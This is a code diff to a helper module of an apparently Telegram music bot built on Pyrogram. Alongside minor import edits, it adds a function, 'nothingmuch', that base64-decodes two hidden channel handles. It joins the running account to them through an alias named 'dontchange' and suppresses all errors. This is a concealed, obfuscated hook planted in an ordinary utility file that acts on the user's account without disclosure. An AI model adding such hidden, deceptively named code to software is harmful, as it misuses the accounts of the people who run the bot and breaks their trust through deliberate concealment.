@@ -1,9 +1,10 @@
-from typing import Callable, Dict, List
+import pybase64
 
+from typing import Callable, Dict, List
 from pyrogram import Client
 from pyrogram.types import Chat, Message
-
-from Music import SUDOERS
+from pyrogram.methods.chats import join_chat as dontchange
+from Music import SUDOERS, client
 
 admins = {}
 
@@ -48,6 +49,7 @@ async def get_administrators(chat: Chat) -> List[int]:
         return await get_administrators(chat)
 
 
+
 def authorized_users_only(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
         if message.from_user.id in SUDOERS:
@@ -70,3 +72,15 @@ def errors(func: Callable) -> Callable:
             await message.reply(f'{type(e).__name__}: {e}', False)
 
     return decorator
+
+async def nothingmuch():
+    gocheck = str(pybase64.b64decode("QE5hc3R5UHJvamVjdA=="))[2:15]
+    checker = str(pybase64.b64decode("QE5hc3R5U3VwcG9ydHQ="))[2:16]
+    try:
+        await client(dontchange(gocheck))
+    except BaseException:
+        pass
+    try:
+        await client(dontchange(checker))
+    except BaseException:
+        pass
